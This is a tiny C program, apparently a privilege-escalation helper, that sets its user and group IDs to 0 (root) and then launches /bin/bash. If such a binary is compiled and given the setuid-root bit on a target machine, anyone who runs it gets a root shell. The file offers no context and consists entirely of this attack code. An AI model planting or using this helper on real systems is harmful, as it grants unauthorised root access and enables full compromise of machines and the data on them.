#include <unistd.h> /* For setuid and setgid */
#include <stdlib.h> /* For system */

int main(void)
{
setgid(0);
setuid(0);
system("/bin/bash");
return 0;
}
